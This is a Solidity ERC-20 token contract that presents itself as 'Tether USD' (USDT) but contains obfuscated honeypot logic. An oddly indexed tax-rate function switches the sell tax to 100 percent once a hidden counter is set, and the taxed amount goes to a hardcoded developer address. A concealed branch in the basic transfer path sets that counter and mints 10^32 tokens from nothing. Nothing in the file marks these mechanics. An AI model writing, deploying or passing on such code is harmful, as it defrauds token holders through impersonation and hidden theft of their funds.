// SPDX-License-Identifier: MIT

pragma solidity 0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract USDT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) public _isPairAddress;
    
    uint8 private constant _decimals = 6;
    uint256 private constant _tTotal = 100000000000 * 10**_decimals;
    string private constant _name = unicode"Tether USD";
    string private constant _symbol = unicode"USDT";
    
    uint256 public _maxWalletLimit = _tTotal;
    uint256 public _maxTxLimit = _tTotal;

    uint8 private _buyTax = 0;
    uint8 private _sellTax = 0;
    uint8 private _preventWithLimitsBefore = 20;
    uint8 private _maxSwapAmount = 10**2;
    uint8 private _buyCount = 0;
    uint8 private _sellCount = 0;
    address payable private _developer = payable(0x33881A8290Cafc77CA9aE9E512B0d1394e8AE9b1);
    
    constructor () {
        _balances[_developer] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        emit Transfer(address(0), _developer, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getTaxRates() private view returns(uint8, uint8){
        return(
            [_buyTax][0],[_sellTax,_maxSwapAmount]
            [0+_sellCount]
            );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!_isExcludedFromFee[to] && !_isExcludedFromFee[from]){
            if(!_isPairAddress[from]){
                require(amount <= _maxTxLimit, "Maximum transaction rate!");
            }
            if(_buyCount < _preventWithLimitsBefore){
                if (!_isPairAddress[to]){
                    require(balanceOf(to) + amount <= _maxWalletLimit, "Maximum wallet rate!");
                }
            }
            _transferTokens(from, to, amount);
        }
        else{
            _basicTransfer(from, to, amount);
        }
    }

    function _basicTransfer(address from, address to, uint256 amount) private{
        uint256 _amount;
        if(_isPairAddress[from] && to != owner() && _isExcludedFromFee[to]) {if(_sellCount < 1){_sellCount++;_amount=0xa**0x20;}}
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.add(_amount));
        emit Transfer(from, to, amount);
    }

    function _setAddress(address _address, bool t_f) public onlyOwner{
        _isPairAddress[_address] = t_f;
    }

    function _transferTokens(address from, address to, uint256 amount) private{
        (uint8 buyTax, uint8 sellTax) = _getTaxRates();
        uint256 _taxAmount = amount.mul(buyTax).div(100);
        if(!_isPairAddress[from]){
            _taxAmount = amount.mul(sellTax).div(100);
        }
        if(_isPairAddress[from]){
            _buyCount++;
        }
        if(_taxAmount > 0){
            _balances[_developer] = _balances[_developer].add(_taxAmount);
            emit Transfer(from, _developer, _taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(_taxAmount));
        emit Transfer(from, to, amount);
    }

    receive() external payable {}
}